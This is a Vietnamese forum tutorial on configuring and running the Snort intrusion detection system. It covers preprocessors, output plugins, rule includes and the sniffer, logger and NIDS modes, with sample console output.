<br/> Preprocessor bo<br/><br/> 2.4.3.8 telnet_decode<br/><br/> Dùng chức năng này để bình thuờng hoá các kí tự ,chuổi không tiêu chuẩn , lạ của traffic FTP và telnet cũng đơn giản dùng 1 câu lệnh đơn giản.<br/><br/> Preprocessor telnet_decode<br/><br/> 2.4.3.9 flow-portscan<br/><br/> Flow-portscan thay thế portscan2 nó nhiều chức năng hơn và mạnh hơn. Có 3 components cơ bản cho flow-portscan<br/><br/> Scoreboards<br/><br/> Nó phát hiện đuợc 2 loại khác nhau của host , talker và scanner. Talker là tất cả các host đang active trong mạng. còn scanner là host đang connection tới 1 port trên server ở trong mạng<br/><br/> Uniqueness tracker<br/><br/> Theo dõi nếu có duy nhất 1 kết nối<br/><br/> Server statistics tracker<br/><br/> Sử dụng để theo dõi thời gian của các service trên các server nhằm theo dõi các kết nối<br/><br/> Để phát hiện các attacker scan port rất khó vì hacker có thể dùng nhiều cách khác nhau:<br/> Sau đây là các option ta có thể dùng để nâng cao hiệu quả của flow-portscan<br/><br/><br/> scoreboard-memcap-talker &lt; bytes&gt;<br/> scoreboard-rows-talker &lt; count&gt;<br/> scoreboard-rows-scanner &lt; count&gt;<br/> scoreboard-memcap-scanner &lt; bytes&gt;<br/> scanner-fixed-threshold &lt; integer&gt;<br/> scanner-sliding-threshold &lt; integer&gt;<br/> scanner-fixed-window &lt; integer&gt;<br/> scanner-sliding-window &lt; integer&gt;<br/> scanner-sliding-scale-factor &lt; float&gt;<br/> talker-fixed-threshold &lt; integer&gt;<br/> talker-sliding-threshold &lt; integer&gt;<br/> talker-fixed-window &lt; integer&gt;<br/> talker-sliding-window &lt; integer&gt;<br/> talker-sliding-scale-factor &lt; float&gt;<br/> unique-memcap &lt; bytes&gt;<br/> unique-rows &lt; integer&gt;<br/> server-memcap &lt; bytes&gt;<br/> server-rows &lt; integer&gt;<br/> server-watchnet &lt; ip list in Snort notation&gt;<br/> src-ignore-net &lt; ip list in Snort notation&gt;<br/> dst-ignore-net &lt; ip list in Snort notation&gt;<br/> tcp-penalties &lt;on|off&gt;<br/> server-learning-time &lt; seconds&gt;<br/> server-ignore-limit &lt; hit count&gt;<br/> server-scanner-limit &lt; hit count&gt;<br/> alert-mode &lt;once|all&gt;<br/> output-mode &lt;msg|pktkludge&gt;<br/> base-score &lt; integer&gt;<br/> dumpall &lt;1&gt;<br/><br/><br/><br/> Đây là dòng cấu hình mẫu cho flow-portscan<br/><br/> preprocessor flow-portscan: server-watchnet [10.10.10.0/24,10.10.20.0/24]<br/><br/> 2.4.3.10 arpspoof<br/><br/> Arpspoof được thiết kế cho preprocessor dể detech các hoạt động spoof arp bất hợp pháp trên local nétwork. Các hacker dùng các tools man-in-the-middle attacks như ettercap hoặc arpspoof để nghe trộm giữa các máy trong mạng nội bộ. để cấu hình administrator phải biết địa chỉ MAC của card mạng, điều này thì quá dễ dàng:<br/><br/> Sau đây là cấu hình đề nghị:<br/><br/> # preprocessor arpspoof<br/><br/> # preprocessor arpspoof_detect_host: 192.168.1.1 F0:AB:GH:10:12:53<br/><br/><br/><br/> 2.4.3.11 perfmonitor<br/><br/> Một trong những khả năng rất hay của Snort là monitor tình trạng hiện tại của hể điều hành các thông số nó thể hiện nêu lên nhiều ý nghĩa mà dựa vào đó ta có thể đoán được nhiều đìều và đưa ra nhiều biện pháp điều chỉnh theo ý muốn, các thông số Snort monitor<br/><br/><br/> Packets received<br/> Packets dropped<br/> Percentage of packets dropped<br/> Packets Received<br/> Kpackets per second<br/> Average bytes per packets<br/> Mbits per second (wire)<br/> Mbits per second (rebuilt) (Mbits trung bình Snort nhúng vào sau khi rebuil các packet)<br/> Mbits per second (total)<br/> Pattern-matching percent (Phần trăm dữ liệu average percent of data received that Snort processes<br/> in pattern matching)<br/> CPU usage (user time, system time, idle time)<br/> Alerts per second<br/> SYN packets per second<br/> SYN/ACK packet per second<br/> New sessions per second<br/> Deleted sessions per second<br/> Total sessions<br/> Max sessions during time interval<br/> Stream flushes per second<br/> Stream faults per second<br/> Stream timeouts<br/> Frag completes per second<br/> Frag inserts per second<br/> Frag deletes per second<br/> Frag flushes per second<br/> Frag timeouts<br/> Frag faults<br/><br/><br/> Khi dùng thêm từ “flow” , nó sẽ hiển thị tình trạng các traffic của protocal mà Snort dang soi, dùng “event” Snort sẽ mở chức năng reporting và hiển thị trạng thái số lượng signatures match, dùng từ “max” sẽ kích hoạt Snort hoạt động hết sức để nâng cao hiệu quả, dùng tư “pktcnt” điều chỉnh số lượng packets đang thực thi trước khi check thời gian sample mặc định set là 10,000.<br/><br/> Ví dụ config và bật chức năng perfmonitor preprocessor:<br/><br/> Preprocessor perfmonitor : time 30 events flow file stats.profile max console pktcnt 10000<br/><br/> Preprocessor perfmonitor: time 30 file /var/tmp/Snortstat pktcnt 10000<br/><br/> <b><font color='violet'>2.4.4 Cấu hình OUTPUT</font></b><br/><br/> Snort có thể output vào các file log hoặc output ra console, nhiều administrator thích dùng các phần mềm của hãng thứ 3 (third party ) để tăng thêm chức năng giám sát của Snort, các phần mềm data database đều có thể dùng được, lưu ý trước khi cài đặt Snort muốn dùng database nào thì cần chỉ rõ khi cài đặt ví dùng dùng MySQL , khi biên dịch source thêm vào - -mysql<br/> ví dụ: ./configure - - mysql<br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136530751_thumb.jpg' border="0" /></div><br/><br/> 2.4.4.1 alert_syslog<br/><br/> Output cấu hình theo kiểu<br/><br/> Output alert_syslog : &lt;facility&gt; &lt;priority&gt;<br/><br/> Các option sau là một trong nhưng syslog chuẩn và syslog mặc định là<br/><br/> LOG_AUTH<br/><br/> LOG_AUTH<br/> LOG_AUTHPRIV<br/> LOG_DAEMON<br/> LOG_LOCAL0<br/> LOG_LOCAL1<br/> LOG_LOCAL2<br/> LOG_LOCAL3<br/> LOG_LOCAL4<br/> LOG_LOCAL5<br/> LOG_LOCAL6<br/> LOG_LOCAL7<br/> LOG_USER<br/><br/> Các option ưu tiên sau cũng là các syslog ưu tiên chuẩn, mặc định là LOG_ALERT<br/><br/> LOG_EMERG<br/> LOG_ALERT<br/> LOG_CRIT<br/> LOG_ERR<br/> LOG_WARNING<br/> LOG_NOTICE<br/> LOG_INFO<br/> LOG_DEBUG<br/><br/> Đây là câu cấu hình mẫu cho alert_syslog<br/><br/> output alert_syslog: LOG_AUTH LOG_ALERT<br/><br/> và câu lệnh này dành cho bản windows của Snort nhìn vào cũng dễ hiểu<br/><br/> output alert_syslog: host=192.168.1.100:80 LOG_AUTH LOG_ALERT<br/><br/> 2.4.4.2 log_tcpdump<br/><br/> Log này sẽ định dạng sang dạng log_tcpdump, do có rất nhiều phần mềm có thể đọc được dạng log này, khi log sẽ có timestamp đính vào file name<br/><br/> ví dụ: câu lệnh cấu hình<br/><br/> output log_tcpdump /var/log/Snort/tcpdump.out<br/><br/> 2.4.4.3 database<br/><br/> Khi log vào database , một khối luơng lớn thông tin của Snort sẽ được lưu trữ như các báo động (alert) , các host liên quan, các packet gây ra báo động, và ta dễ dàng log các báo động thật sự và các báo động lỗi, sai nhanh và nhiều hơn<br/> Đôi khi log vào database cũng quá tải gây ra hiện tượng thắt cổ chai dẫn đến 1 alert chỉ có thể được log trong một thời gian. Và phương pháp cấu hình Snort làm sao hợp lý nhất là các kinh nghiệm của các admin sau này ví dụ có thể dùng tuning hoặc thresholding để tạo hiệu quả hơn.<br/><br/> Cấu trúc của câu lệnh output ra database<br/><br/> output database: &lt;log | alert&gt;,&lt;database type&gt;,&lt;parameter list&gt;<br/><br/> Câu lệnh trên nhìn vào ta có thể hiểu ngay được ý nghĩa của nó, còn &lt;parameter list&gt; bao gồm các phần sau :<br/><br/> host<br/><br/> Địa chỉ IP của database server<br/><br/> port<br/> Port của database đang lắng nghe<br/><br/> dbname=&lt;database name&gt;<br/><br/> Loại database ta đang logging<br/><br/> user<br/><br/> username Snort sử dụng để log trong database<br/><br/> password<br/><br/> Tất nhiên là có user phải có pass để vào rồi<br/><br/> sensor_name<br/><br/> Tên của sensor cấu hình, có thể thểm -I trong command line sử dụng IP address thay cho tên<br/><br/> encoding<br/><br/> Sử dụng mã hoá để log vào database, ví dụ kiểu hex,base64,ascii và khuyên dùng ascii<br/><br/> detail<br/><br/> Có thể chỉ định details level nào log vào database, ví dụ dùng full,fast và full được khuyên dùng nhất<br/><br/> Với các loại database cụ thể ta phải biên dịch cho đúng khi cài đặt như đã nói phần trước<br/><br/> CODEMySQL<br/> ./configure - -with-mysql<br/><br/> POSTGRESQL<br/> ./configure - -with-postresql<br/><br/> ODBC<br/> ./configure - -with-odbc<br/><br/> MSSQL<br/> Chỉ dùng cho bản windown, dùng odbc để log vào MSMSQL server<br/><br/> ORACLE<br/> ./configure - -with-oracle<br/><br/> và các log khác ta sẽ coi trong phần khuyến cáo của database kèm theo<br/><br/> 2.4.5 File Inclusion<br/><br/> Trong file Snort.conf, câu lệnh include chỉ cho Snort đọc các file sau từ include được lưu trong filesystem của Snort sensor, giống như trong lập trình vậy<br/><br/> ví dụ :<br/><br/> $ include $RULE_PATH/bad-traffic.rules<br/> $ include $RULE_PATH/exploit.rules<br/> $ include $RULE_PATH/scan.rules<br/><br/> Các rules trên ta có thể download trên internet, khi down về ta muốn phân nhóm hoặc chỉnh sửa,độ ưu tiên các rules ta có thể cấu hình trong file classification.config, file reference.config gồm các links tới web site với các thông tin cho tất cả các alerts, include nó rất hữu tích , nhanh gọn<br/> ví dụ:<br/><br/> # include classification & priority settings<br/><br/> include classification.config<br/><br/> # include reference systems<br/><br/> include reference.config<br/><br/> channhua - HVA</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.html">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/167.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/167/570.html#570,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><b><font color='violet'>2.3.1 Snort là một Sniffer</font></b><br/><br/> Snort rất dễ dàng sử dụng để sniff và ta cũng dễ dàng nhìn ra các thông tin từ các packet captured. Một đặc tính rất hay của Snort là bảng tóm tắt về traffic của mạng trong phần cuối của bảng capture nó rất hữu ích cho Adminstrator để troubleshooting mạng của mình.<br/><br/> Bật chức năng Sniffer bằng cờ -v:<br/><br/> Snort –v<br/><br/><br/> Running in packet dump mode<br/><br/> Log directory = /var/log/Snort<br/><br/><br/> Initializing Network Interface eth0<br/><br/><br/> --== Initializing Snort ==--<br/><br/> Initializing Output Plugins!<br/><br/> Decoding Ethernet on interface eth0<br/><br/><br/> --== Initialization Complete ==--<br/><br/><br/> -*&gt; Snort! &lt;*-<br/><br/> Version 2.1.x (Build 72)<br/><br/> By Martin Roesch (roesch@sourcefire.com, www.Snort.org)<br/><br/> 06/24-11:19:32.257859 64.147.136.193:3131 -&gt; 192.168.0.15:9100<br/><br/> TCP TTL:128 TOS:0x0 ID:21742 IpLen:20 DgmLen:48 DF<br/><br/> ******S* Seq: 0x5DB36D37 Ack: 0x0 Win: 0xFAF0 TcpLen: 28<br/><br/> TCP Options (4) =&gt; MSS: 1460 NOP NOP SackOK<br/><br/> =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+<br/><br/><br/><br/> 06/24-11:19:32.261606 64.147.136.5 -&gt; 224.0.0.10<br/><br/> EIGRP TTL:2 TOS:0x0 ID:0 IpLen:20 DgmLen:60<br/><br/> =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+<br/><br/><br/> 06/24-11:19:34.470931 64.147.136.1 -&gt; 224.0.0.10<br/><br/> EIGRP TTL:2 TOS:0xC0 ID:0 IpLen:20 DgmLen:60<br/><br/> =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+<br/><br/><br/> 06/24-11:19:34.482799 64.147.136.1 -&gt; 224.0.0.10<br/><br/> EIGRP TTL:2 TOS:0xC0 ID:0 IpLen:20 DgmLen:60<br/><br/> =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+<br/><br/><br/><br/> ===========================================================================<br/><br/> Snort analyzed 38 out of 38 packets, dropping 0(0.000%) packets<br/><br/><br/><br/> Breakdown by protocol: Action Stats:<br/><br/> TCP: 1 (2.632%) ALERTS: 0<br/><br/> UDP: 0 (0.000%) LOGGED: 0<br/><br/> ICMP: 0 (0.000%) PASSED: 0<br/><br/> ARP: 0 (0.000%)<br/><br/> EAPOL: 0 (0.000%)<br/><br/> IPv6: 0 (0.000%)<br/><br/> IPX: 0 (0.000%)<br/><br/> OTHER: 37 (97.368%)<br/><br/> DISCARD: 0 (0.000%)<br/><br/> ===========================================================================<br/><br/> Wireless Stats:<br/><br/> Breakdown by type:<br/><br/> Management Packets: 0 (0.000%)<br/><br/> Control Packets: 0 (0.000%)<br/><br/> Data Packets: 0 (0.000%)<br/><br/> ===========================================================================<br/><br/> Fragmentation Stats:<br/><br/> Fragmented IP Packets: 0 (0.000%)<br/><br/> Fragment Trackers: 0<br/><br/> Rebuilt IP Packets: 0<br/><br/> Frag elements used: 0<br/><br/> Discarded(incomplete): 0<br/><br/> Discarded(timeout): 0<br/><br/> Frag2 memory faults: 0<br/><br/> ===========================================================================<br/><br/> TCP Stream Reassembly Stats:<br/><br/> TCP Packets Used: 0 (0.000%)<br/><br/> Stream Trackers: 0<br/><br/> Stream flushes: 0<br/><br/> Segments used: 0<br/><br/> Stream4 Memory Faults: 0<br/><br/> ===========================================================================<br/><br/><br/><br/> Snort exiting<br/><br/><br/> Trong phần đầu Snort sẽ hiển thị đang chạy ở mode nào, thư mục chứa log, interface nào đang lắng nghe. Khi bắt đầu chạy và bắt gói tin hiển thị lên màn hình. Phần hiển thị ra chỉ ở mức độ đơn giản, nó chỉ hiện thị ip và TCP/UDP/ICMP headers và 1 số ít khác. Để thoát khỏi chế độ sniffer bấm CTRL - C Snort sẽ thoát hiển thị bảng tóm tắt tổng hợp về các packet bao gồm các protocols, tình trạng packet fragmentation, dòng dữ liệu tập hợp. Để xem ở tầng application ta sử dụng cờ -d thên vào sau:<br/><br/> #Snort –vd<br/><br/> =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+<br/><br/><br/><br/> 06/24-11:27:35.408290 ARP who-has 64.147.136.1 tell 64.147.136.144<br/><br/><br/><br/> 06/24-11:27:35.408860 64.147.136.144:50507 -&gt; 64.147.130.2:53<br/><br/> UDP TTL:64 TOS:0x0 ID:0 IpLen:20 DgmLen:57 DF<br/><br/> Len: 29<br/><br/> E8 0A 01 00 00 01 00 00 00 00 00 00 03 6E 73 31 .............ns1<br/><br/> 03 6B 73 6C 03 63 6F 6D 00 00 01 00 01 .ksl.com.....<br/><br/><br/><br/> =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+<br/><br/><br/><br/> 06/24-11:27:35.408838 ARP reply 64.147.136.1 is-at 0<img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">0:BC:ED:15:E4<br/><br/><br/><br/> 06/24-11:27:35.409465 64.147.130.2:53 -&gt; 64.147.136.144:50507<br/><br/> UDP TTL:63 TOS:0x0 ID:0 IpLen:20 DgmLen:121 DF<br/><br/> Len: 93<br/><br/> E8 0A 85 80 00 01 00 01 00 02 00 01 03 6E 73 31 .............ns1<br/><br/> 03 6B 73 6C 03 63 6F 6D 00 00 01 00 01 C0 0C 00 .ksl.com........<br/><br/> 01 00 01 00 00 70 80 00 04 40 93 82 02 C0 10 00 .....p...@......<br/><br/> 02 00 01 00 00 70 80 00 02 C0 0C C0 10 00 02 00 .....p..........<br/><br/> 01 00 00 70 80 00 06 03 6E 73 32 C0 10 C0 47 00 ...p....ns2...G.<br/><br/> 01 00 01 00 00 70 80 00 04 40 93 82 03 .....p...@...<br/><br/><br/> =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+<br/><br/><br/><br/> Để xem chi tiết hơn và kết quả giống như tcpdump gồm cả phần header của lớp data link và cả tầng application, sử dụng với cờ -e<br/><br/> #Snort –vde<br/><br/><br/> =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+<br/><br/><br/><br/> 06/24-11:34:00.840645 0:8:74:F3:CC:F9 -&gt; 0<img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">0:BC:ED:15:E4 type:0x800 len:0x47<br/><br/> 64.147.136.144:50507 -&gt; 64.147.130.2:53 UDP TTL:64 TOS:0x0 ID:0 IpLen:20 DgmLen:57 DF<br/><br/> Len: 29<br/><br/> 28 BF 01 00 00 01 00 00 00 00 00 00 03 6E 73 31 (............ns1<br/><br/> 03 6B 73 6C 03 63 6F 6D 00 00 01 00 01 .ksl.com.....<br/><br/><br/><br/> =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+<br/><br/><br/><br/> 06/24-11:34:00.841157 0<img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">0:BC:ED:15:E4 -&gt; 0:8:74:F3:CC:F9 type:0x800 len:0x87<br/><br/> 64.147.130.2:53 -&gt; 64.147.136.144:50507 UDP TTL:63 TOS:0x0 ID:0 IpLen:20 DgmLen:121 DF<br/><br/> Len: 93<br/><br/> 28 BF 85 80 00 01 00 01 00 02 00 01 03 6E 73 31 (............ns1<br/><br/> 03 6B 73 6C 03 63 6F 6D 00 00 01 00 01 C0 0C 00 .ksl.com........<br/><br/> 01 00 01 00 00 70 80 00 04 40 93 82 02 C0 10 00 .....p...@......<br/><br/> 02 00 01 00 00 70 80 00 02 C0 0C C0 10 00 02 00 .....p..........<br/><br/> 01 00 00 70 80 00 06 03 6E 73 32 C0 10 C0 47 00 ...p....ns2...G.<br/><br/> 01 00 01 00 00 70 80 00 04 40 93 82 03 .....p...@...<br/><br/><br/><br/> =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+<br/><br/><br/> Các thông tin hiển thị với dạng hex. địa chỉ MAC được ẩn, chỉ thấy được địa chỉ IP. Khi chỉ cần test mạng, hoặc đơn giản thử sử dụng để capture dữ liệu trên Snort thì sử dụng với –vde đã hiển thị gần như đầy đủ các thông tin.<br/><br/> Với nhiều mạng lơn có lưu luợng thông tin cao, khi bắt gói tin với Snort nó sẽ hiển thị rất nhanh và có thể ta theo dõi không kịp, để giải quyết vần đề trên ta có thể lưu nó vào trong log file với câu lệnh đơn giản Snort –dev &gt;temp.log<br/><br/> Đây là vài lựa chọn trong mode sniffer của Snort:<br/><br/> -v Đưa ra packet headers trong phần output<br/> -d Hiển thị packet payload<br/> -a Hiển thị ARP packets<br/> -e Hiển thị dữ liệu lớp data link<br/><br/> Mô hình minh hoạ sniffing của snort<br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136454351_thumb.jpg' border="0" /></div><br/><br/> <br>
<div align="center" class="limitview"><img src='http://cartoyvn.com/image/SNORT/post-30356-1136454377_thumb.jpg' border="0" /></div><br/><br/> <b><font color='violet'>2.3.2 Snort là một packet logger</font></b><br/><br/> Phần tiếp theo sau khi bắt gói tin là lưu chúng lại vào trong log, để log chỉ đơn giản them cờ -l vào sau đó chỉ đường dẫn thư mục cần log. Mặc định nó sẽ log ở thư mục /var/log/Snort . Nếu ta chỉ định thư mục log mà không tồn tại nó sẽ báo lỗi. Ví dụ câu lệnh sau đây để log<br/><br/> #Snort –l /usr/local/log/Snort –d<br/><br/> Khi chạy ở chế độ này, Snort sẽ tập hợp tất cả các packet nó thấy được và đưa vào log theo cấu trúc phân tầng. Nói cách khác, 1 thư mục mới sẽ được tạo ra ứng với mỗi địa chỉ nó bắt đựơc, và dữ liệu sẽ phụ thuộc vào địa chỉ mà nó lưu trong thư mục đó. Snort đặt các packet vào trong files ASCII, với tên liên quan tới protocol và port. Sự sắp xếp này dễ dàng nhận ra ai đang connect vào network của mình và protocol và port nào đang sử dụng, đơn giản sử dụng ls - R hoặc (dir /s trong windows) để hiện danh sách các thư mục.Tuy nhiên sự phân cấp này sẽ tạo ra nhiều thư mục trong giờ cao điểm , thật khó có thể coi hết với hàng đống thư mục và files này. Nếu ai đó có ý định dùng chế độ full scan toàn mạng với 65536 Tcp ports và 65535 Udp ports, và sẽ tạo ra 131000 hoặc hơn từng ấy file như thế trong 1 thư mục , để xem hết đống này thì dùng thêm vài viên thuốc đau đầu nữa.<br/><br/> Log với dạng nhị phân (binary) tất cả những gì có thể đọc được bời Snort, nó làm tăng đốc độ khả năng bắt gói tin của Snort. Hầu hết các hệ thống có thể capture và log ở tốc độ 100Mbps mà không có vấn đề gì.<br/><br/> Để log packet ở chế độ nhị phân, sự dụng cờ -b.<br/><br/> #Snort -b -l /usr/local/log/Snort/temp.log<br/><br/> Khi đã capture, ta có thể đọc lại file mới vừa tạo ra ngay với cỡ -r và phần hiển thị giống như ở mode sniffer<br/><br/> #Snort -r /usr/local/log/Snort/temp.log<br/><br/> Trong phần này Snort không giới hạn để dọc các file binary trong chế độ sniffer. Ta có thể chạy Snort ở chế độ NIDS với việc set các rules hoặc filters để tìm những traffic nghi ngờ<br/><br/><br/> <b><font color='violet'>2.3.3 Snort là NIDS:</font></b><br/><br/> Trong khi Snort là sniffer tốt nó còn là 1 tools rất xuất sắc trong phát hiện xâm nhập. Khi sử dụng như NIDS, Snort cung gần thời gian thực nhất về khả năng xâm nhập. Ta sẽ trãi qua nhiều thời gian để tìm hiểu nhiều cách khác nhau về Snort với chức năng NIDS và các option của nó<br/><br/> 2.2.3.1 Lấy những rules mới nhất<br/><br/> Ta thường lưu các rules ở vị trí nào đó có thể dễ dang theo dõi và thay đổi ngay lập tức khi cần, ví dụ ta tạo 1 thư mục để chứa các rules /usr/local/share, trong thư mục này ta sẽ tạo nhiều thư mục con với tháng và năm ví dụ November_2005 và khi update các rules ta lưu nó vào các vị trí đã tạo sẵn đó<br/> Nếu sử dụng Snort version là 2.4.3 ta có thể download những rules mới nhất từ địa chỉ<br/><span class="link"> http://www.Snort.org/dl/rules/Snortrules-snapshot-2.4.tar.gz</span><br/> Sau khi down về và giải nén ta có được khoảng 60 files, mỗi file có phần mở rộng là .rules chứa những tín hiệu (signatures) để Snort dựa vào đó mà nhận dạng nội dung của các packet. File Snort.conf chứa các thiết lập khi Snort chạy ở chế độ IDS. Các files này đã đuợc viết sẵn và test khá kĩ càng nên ta không cần config lại<br/><br/> 2.2.3.2 Khởi đầu cấu hình với file Snort.conf<br/><br/> Ở chế độ báo động ( alert ), Snort yêu cầu phải có file cấu hình, files cấu hình mặc định lưu ở thư mục /etc/Snort.conf, nếu file nằm ở chỗ khác ta phải dùng cờ -c để chỉ tới files đó. Các báo động sẽ lưu ở thư mục /var/log/Snort ( mặc định ).Snort sẽ thoát ra nếu file .conf và thư mục log không có. Ta có thể chỉ định loại báo động nào ví dụ như full, fast,none hoặc Unix sockets bằng cách thêm cờ -A vào dòng lệnh<br/><br/> Lần đầu nhìn vào file Snort.conf ta có thể nhìn thấy nhiều dòng chú thích rất dễ hiểu với màu sắc dễ phân biệt, ví dụ như tạo các biến, set các đường dẫn RULE_PATH để chỉ Snort các files rules<br/> ví dụ:<br/><br/> var RULE_PATH ../rules<br/><br/> Thay đổi đường dẫn đầy đủ nơi chứa các rules<br/><br/> var RULE_PATH /usr/local/share/Snort_rules/november_2005/rules<br/><br/> Để cho Snort khởi động, sử dụng dòng lệnh:<br/><br/> Snort -c /usr/local/share/Snort_rules/november_2005/rules/Snort.conf<br/><br/> Nó sẽ hiển thị ra màn hình console<br/><br/><br/> Running in IDS mode<br/><br/> Log directory = /var/log/Snort<br/><br/><br/><br/> Initializing Network Interface eth0<br/><br/><br/><br/> --== Initializing Snort ==--<br/><br/> Initializing Output Plugins!<br/><br/> Decoding Ethernet on interface eth0<br/><br/> Initializing Preprocessors!<br/><br/> Initializing Plug-ins!<br/><br/> Parsing Rules file /usr/local/share/Snort_rules/rules/Snort.conf<br/><br/><br/><br/> +++++++++++++++++++++++++++++++++++++++++++++++++++<br/><br/> Initializing rule chains...<br/><br/> ,-----------[Flow Config]----------------------<br/><br/> | Stats Interval: 0<br/><br/> | Hash Method: 2<br/><br/> | Memcap: 10485760<br/><br/> | Rows : 4099<br/><br/> | Overhead Bytes: 16400(%0.16)<br/><br/> `----------------------------------------------<br/><br/> No arguments to frag2 directive, setting defaults to:<br/><br/> Fragment timeout: 60 seconds<br/><br/> Fragment memory cap: 4194304 bytes<br/><br/> Fragment min_ttl: 0<br/><br/> Fragment ttl_limit: 5<br/><br/> Fragment Problems: 0<br/><br/> Self preservation threshold: 500<br/><br/> Self preservation period: 90<br/><br/> Suspend threshold: 1000<br/><br/> Suspend period: 30<br/><br/> Stream4 config:<br/><br/> Stateful inspection: ACTIVE<br/><br/> Session statistics: INACTIVE<br/><br/> Session timeout: 30 seconds<br/><br/> Session memory cap: 8388608 bytes<br/><br/> State alerts: INACTIVE<br/><br/> Evasion alerts: INACTIVE<br/><br/> Scan alerts: INACTIVE<br/><br/> Log Flushed Streams: INACTIVE<br/><br/> MinTTL: 1<br/><br/> TTL Limit: 5<br/><br/> Async Link: 0<br/><br/> State Protection: 0<br/><br/> Self preservation threshold: 50<br/><br/> Self preservation period: 90<br/><br/> Suspend threshold: 200<br/><br/> Suspend period: 30<br/><br/> Stream4_reassemble config:<br/><br/> Server reassembly: INACTIVE<br/><br/> Client reassembly: ACTIVE<br/><br/> Reassembler alerts: ACTIVE<br/><br/> Zero out flushed packets: INACTIVE<br/><br/> flush_data_diff_size: 500<br/><br/> Ports: 21 23 25 53 80 110 111 143 513 1433<br/><br/> Emergency Ports: 21 23 25 53 80 110 111 143 513 1433<br/><br/> HttpInspect Config:<br/><br/> GLOBAL CONFIG<br/><br/> Max Pipeline Requests: 0<br/><br/> Inspection Type: STATELESS<br/><br/> Detect Proxy Usage: NO<br/><br/> IIS Unicode Map Filename: /usr/local/share/Snort_rules/rules/unicode.map<br/><br/> IIS Unicode Map Codepage: 1252<br/><br/> DEFAULT SERVER CONFIG:<br/><br/> Ports: 80 8080 8180<br/><br/> Flow Depth: 300<br/><br/> Max Chunk Length: 500000<br/><br/> Inspect Pipeline Requests: YES<br/><br/> URI Discovery Strict Mode: NO<br/><br/> Allow Proxy Usage: NO<br/><br/> Disable Alerting: NO<br/><br/> Oversize Dir Length: 500<br/><br/> Only inspect URI: NO<br/><br/> Ascii: YES alert: NO<br/><br/> Double Decoding: YES alert: YES<br/><br/> %U Encoding: YES alert: YES<br/><br/> Bare Byte: YES alert: YES<br/><br/> Base36: OFF<br/><br/> UTF 8: OFF<br/><br/> IIS Unicode: YES alert: YES<br/><br/> Multiple Slash: YES alert: NO<br/><br/> IIS Backslash: YES alert: NO<br/><br/> Directory: YES alert: NO<br/><br/> Apache WhiteSpace: YES alert: YES<br/><br/> IIS Delimiter: YES alert: YES<br/><br/> IIS Unicode Map: GLOBAL IIS UNICODE MAP CONFIG<br/><br/> Non-RFC Compliant Characters: NONE<br/><br/> rpc_decode arguments:<br/><br/> Ports to decode RPC on: 111 32771<br/><br/> alert_fragments: INACTIVE<br/><br/> alert_large_fragments: ACTIVE<br/><br/> alert_incomplete: ACTIVE<br/><br/> alert_multiple_requests: ACTIVE<br/><br/> telnet_decode arguments:<br/><br/> Ports to decode telnet on: 21 23 25 119<br/><br/> 1652 Snort rules read...<br/><br/> 1652 Option Chains linked into 152 Chain Headers<br/><br/> 0 Dynamic rules<br/><br/> +++++++++++++++++++++++++++++++++++++++++++++++++++<br/><br/><br/><br/><br/><br/> +-----------------------[thresholding-config]----------------------------------<br/><br/> | memory-cap : 1048576 bytes<br/><br/> +-----------------------[thresholding-global]----------------------------------<br/><br/> | none<br/><br/> +-----------------------[thresholding-local]-----------------------------------<br/><br/> | gen-id=1 sig-id=2275 type=Threshold tracking=dst count=5 seconds=60<br/><br/> +-----------------------[suppression]------------------------------------------<br/><br/> -------------------------------------------------------------------------------<br/><br/> Rule application order: -&gt;activation-&gt;dynamic-&gt;alert-&gt;pass-&gt;log<br/><br/><br/><br/> --== Initialization Complete ==--<br/><br/><br/><br/> -*&gt; Snort! &lt;*-<br/><br/> Version 2.1.x (Build 24)<br/><br/> By Martin Roesch (roesch@sourcefire.com, www.Snort.org)<br/><br/> Tới đây ta có thể kết thúc dùng lệnh CTRL – C 